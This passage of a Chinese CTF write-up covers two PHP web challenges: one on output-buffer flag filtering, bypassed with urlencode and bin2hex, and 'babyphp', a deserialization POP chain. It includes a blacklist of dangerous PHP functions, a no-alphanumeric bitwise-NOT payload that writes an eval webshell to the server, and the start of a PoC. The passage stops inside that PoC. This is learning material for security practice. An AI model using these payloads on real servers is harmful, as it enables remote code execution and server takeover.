class="hljs-comment">#line88</span><br></code></pre></td></tr></table></figure><p>去学习了下php中的<a href="https://www.php.net/manual/zh/function.ob-start.php">ob_start()</a>：</p><p>ob_start — 打开输出控制缓冲</p><p>ob_start(callable $callback)，内部缓冲区的内容可以用 <a href="https://www.php.net/manual/zh/function.ob-get-contents.php">ob_get_contents()</a> 复制到字符串变量中。想要输出存储在内部缓冲区中的内容，使用 <a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> 函数。另外，使用 <a href="https://www.php.net/manual/zh/function.ob-end-clean.php">ob_end_clean()</a> 函数会静默丢弃掉缓冲区的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wiki">警告<br>当有正在调用的回调函数时，一些 Web 服务器（例如 Apache）会改变脚本的工作目录。可以在回调函数中再把它改回来，例如 chdir(dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]))。#也就是line182<br></code></pre></td></tr></table></figure><p>参数：</p><p>$callback：</p><p>可选参数 <code>callback</code> 函数可以被指定。此函数把一个字符串当作参数并返回一个字符串。当输出缓冲区被（<a href="https://www.php.net/manual/zh/function.ob-flush.php">ob_flush()</a>、<a href="https://www.php.net/manual/zh/function.ob-clean.php">ob_clean()</a> 或者相似的函数）冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。当调用 <code>callback</code> 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。如果这个 <code>callback</code> 不是一个可以调用的函数，此函数会返回 **<code>false</code>**。如果 <code>callback</code> 返回 <strong><code>false</code></strong> ，其原来的输入内容被直接送到浏览器。这个参数 <code>callback</code> 可以通过直接给一个 <strong><code>null</code></strong> 值而避开。</p><p>buffer：</p><p>输出缓冲区中的内容。</p><p>以下为用户自定义回调函数的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>function callback($buffer)#不理解上面ob_start(&quot;cacheCtrl&quot;)的可以结合这个看下，cacheCtrl的参数buffer和callback的参数buffer<br>&#123;<br>  // replace all the apples with oranges<br>  return (str_replace(&quot;apples&quot;, &quot;oranges&quot;, $buffer));<br>&#125;<br><br>ob_start(&quot;callback&quot;);<br><br>?&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;p&gt;It&#x27;s like comparing apples to oranges.&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;?php<br><br>ob_end_flush();<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>会输出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>It&#x27;s like comparing oranges to oranges.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>“当调用 <code>callback</code> 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器”</p><p>也就是说，本题原本的$buffer为真正的flag，但是经过filterFunc的洗礼之后变成了fakeflag，调用cacheCtrl之后替换掉了原先位于缓冲区的真正的flag，将被送到浏览器。</p><p><a href="https://www.php.net/manual/zh/function.ob-end-flush.php">ob_end_flush()</a> - 冲刷出（送出）输出缓冲区内容并关闭缓冲区：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">#line92</span><br>     @<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>最终fakeflag从缓冲区被推向浏览器显示出来。</p><p>输出fakeflag的机制弄清楚了，根据<code>fileterOriginFlag()</code>的内容，原先buffer中的”ROIS{.*}”会被替换掉，那么只要我的输出中不包含这样的结构不就可以了吗。改变结构的想法无非就是编码、逆序。这里查看最上面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<br></code></pre></td></tr></table></figure><p>发现base64编码被ban，逆序函数<code>strrev()</code>也被ban，<code>md5()</code>是没被ban但是总没有人敢手撕那坨玩意吧（</p><p><code>urlencode()</code>没被ban，已知flag中包含”{}”，url编码之后大括号形式改变。</p><p><img src="/2023/02/10/ROIS/image-20230409020606351.png"></p><p>url解码得到真正的flag。<code>bin2hex()</code>函数也没被ban，能将结果变为16进制。</p><p><img src="/2023/02/10/ROIS/image-20230409020801312.png"></p><p>hex解码后得到真正的flag。</p><p>那么如果不从浏览器中显示，而是直接读取文件呢？这样一来就不会有通过浏览器将fakeflag显示出来了，即使缓冲区被修改了也不会通过浏览器被读取因为是直接读取文件。没错也就是上马实现rce后用蚁剑连接。</p><p>但是在层层的过滤之下怎么getshell呢？这时候就要有请无数字字母rce了</p><p>学习了<a href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">这篇文章</a>，用了大佬的无字母数字rce：</p><p><img src="/2023/02/10/ROIS/image-20230409154816719.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CB%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure><p>自己动手操作一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;file_put_contents&quot;</span>;<br><span class="hljs-variable">$b</span>=~<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;233.php&quot;</span>;<br><span class="hljs-variable">$c</span>=~<span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>;<br><span class="hljs-variable">$d</span>=~<span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-comment">#output:</span><br><span class="hljs-comment">#%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C</span><br><span class="hljs-comment">#%CD%CC%CC%D1%8F%97%8F</span><br><span class="hljs-comment">#%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4</span><br></code></pre></td></tr></table></figure><p>因此rce应为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CD%CC%CC%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure><p>cmd传入：</p><p><img src="/2023/02/10/ROIS/image-20230409161554426.png"></p><p>发现已经写入当前目录了(如果没有写入说明当前目录对用户没开放写入权限，就要写入&#x2F;tmp目录)</p><p><img src="/2023/02/10/ROIS/image-20230409161615101.png"></p><p>木马上完了，打开蚁剑，测试连接，连接成功。</p><p><img src="/2023/02/10/ROIS/image-20230409161705804.png"></p><p>读取根目录下的flag：</p><p><img src="/2023/02/10/ROIS/image-20230409161802859.png"></p><p>附：</p><ol><li><p>缓冲(buffer)与缓存(cache)：</p><ul><li><p>缓冲：为提高内存硬盘或其他I&#x2F;O设备之间数据交换的效率而设计，当创建一个buffer对象时，会先创建一个缓冲区数组，然后我们读一个文件时，会先从硬盘中读到缓冲区，待缓冲区满了再进行传送（比如要使用echo输出，会将输出先存入缓存区中）。</p></li><li><p>缓存：为提高cpu和内存之间的数据交换效率而设计。当计算机执行程序时，数据与地址管理部件会 预测 可能要用到的数据和指令, 并将这些数据和指令预先从内存中读出送到Cache. 一旦需要时，先检查Cache，若有就从Cache中读取，若无再访问内存。</p></li><li><p>buffer侧重写，cache侧重读。</p></li><li><p>举例：</p></li><li><p>buffer：倒垃圾不会一有垃圾就直接跑去垃圾站倒，而是先把垃圾扔垃圾桶里，等垃圾桶满了再去垃圾场倒。垃圾桶就是这个缓冲容器。</p></li><li><p>cache：缓存视频。</p></li><li><p>php中的输出流程：</p><p>php输出语句&#x2F;函数-&gt;php缓冲区配置-&gt;web服务器缓冲区配置-&gt;浏览器缓冲区-&gt;浏览器显示</p></li><li><p>php常用函数：</p><ul><li><p>获取buffer中的内容：<code>ob_get_contents()</code>，使用案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-variable">$buffer</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#浏览器中显示&quot;hello world&quot;，log.txt中写入&quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>清空buffer：<code>ob_clean()</code>，使用案例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;log.txt&#x27;</span>,<span class="hljs-variable">$buffer</span>);<br><span class="hljs-title function_ invoke__">ob_clean</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#浏览器中不显示&quot;hello world&quot;，而log.txt储存了&quot;hello world&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>ob_get_length()   - 返回输出缓冲区的长度</p></li><li><p>ob_get_level()    - 返回输出缓冲区的嵌套级别</p></li><li><p>ob_get_status()   - 返回输出缓冲区的状态（数组形式返回，默认返回最顶层，参数为true时返回所有）</p></li><li><p>ob_end_clean()    - 清空（擦除）缓冲区并关闭输出缓冲</p></li><li><p>ob_get_flush()     - 以字符串返回输出缓冲区内容并关闭缓冲</p></li><li><p>ob_end_flush()    - 冲刷出（送出）输出缓冲区内容缓冲并关闭输出缓冲</p></li></ul></li></ul></li><li><p>php ob_start()中的一个小小思考：</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-title function_ invoke__">ob_start</span>();              <span class="hljs-comment">// start output buffer 1</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span>;                <span class="hljs-comment">// fill ob1</span><br>        <br>        <span class="hljs-title function_ invoke__">ob_start</span>();              <span class="hljs-comment">// start output buffer 2</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;b&quot;</span>;                <span class="hljs-comment">// fill ob2</span><br>        <span class="hljs-variable">$s1</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// read ob2 (&quot;b&quot;)</span><br>        <span class="hljs-title function_ invoke__">ob_end_flush</span>();          <span class="hljs-comment">// flush ob2 to ob1</span><br>        <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;c&quot;</span>;                <span class="hljs-comment">// continue filling ob1</span><br>    <span class="hljs-variable">$s2</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>(); <span class="hljs-comment">// read ob1 (&quot;a&quot; . &quot;b&quot; . &quot;c&quot;)</span><br>    <span class="hljs-title function_ invoke__">ob_end_flush</span>();          <span class="hljs-comment">// flush ob1 to browser</span><br>    <br>    <span class="hljs-comment">// echoes &quot;b&quot; followed by &quot;abc&quot;, as supposed to:</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;HR&gt;<span class="hljs-subst">$s1</span>&lt;HR&gt;<span class="hljs-subst">$s2</span>&lt;HR&gt;&quot;</span>;<br>    <br><span class="hljs-meta">?&gt;</span><br>    <br> <span class="hljs-comment">#输出</span><br></code></pre></td></tr></table></figure><p>3.php中系统命令执行函数：</p><table><thead><tr><th>函数</th><th>作用</th><th>使用</th></tr></thead><tbody><tr><td>system()</td><td>执行系统命令，输出执行结果</td><td>system(“ls”)</td></tr><tr><td>exec()</td><td>执行系统命令，不输出执行结果，返回执行结果数组</td><td>exec(‘ls’,$result)</td></tr><tr><td>passthru()</td><td>执行系统命令，输出执行结果(支持二进制)</td><td>passthru(“ls”)</td></tr><tr><td>shell_exec()</td><td>执行系统命令，不输出结果，返回执行结果字符串</td><td>shell_exec(“ls”)</td></tr><tr><td>popen</td><td>执行系统命令，不输出结果，返回一个资源类型</td><td>popen(“ls”,’r’)</td></tr><tr><td>&#96;&#96;</td><td>执行系统命令，不输出结果，返回执行结果字符串</td><td><code>ls</code></td></tr></tbody></table><p>4.无数字字母rce相关文章：</p><ul><li><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">ctfshow大挑战rce篇</a></li><li><a href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">Arsene.Tang的RCE篇之无数字字母rce</a></li><li><a href="https://potatowo233.github.io/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/">Potat0w0的（</a></li></ul><hr><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure><p>再看__call()方法下的规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure><p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p><p>编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span 